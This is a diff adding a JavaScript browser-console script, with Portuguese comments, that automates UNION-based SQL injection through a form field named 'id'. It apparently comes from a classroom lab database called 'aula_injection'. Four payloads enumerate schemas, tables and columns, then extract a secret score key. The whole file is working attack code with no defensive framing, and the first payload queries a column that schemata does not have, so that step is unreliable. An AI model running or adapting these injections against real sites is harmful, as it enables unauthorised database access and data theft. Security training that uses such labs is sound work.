@@ -1,0 +1,41 @@
+// Descobrir o nome do banco de dados
+function send_sql(command){
+    inp = document.getElementsByName("id")[0];
+    inp.value = command;
+    button = document.getElementsByName("Submit")[0];
+    button.click()
+}
+send_sql("' UNION SELECT schema_name, table_name from information_schema.schemata#");
+
+
+//
+// Descobrir o nome da tabela
+function send_sql(command){
+    inp = document.getElementsByName("id")[0];
+    inp.value = command;
+    button = document.getElementsByName("Submit")[0];
+    button.click()
+}
+send_sql("' UNION SELECT 1, table_name from information_schema.tables#");
+
+
+//
+// Descobrir o nome da coluna
+function send_sql(command){
+    inp = document.getElementsByName("id")[0];
+    inp.value = command;
+    button = document.getElementsByName("Submit")[0];
+    button.click()
+}
+send_sql("' UNION SELECT 1, column_name from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='chave'#");
+
+
+//
+// Fazer o select do item
+function send_sql(command){
+    inp = document.getElementsByName("id")[0];
+    inp.value = command;
+    button = document.getElementsByName("Submit")[0];
+    button.click()
+}
+send_sql("' UNION SELECT 1, chave_pontuacao from aula_injection.chave#");
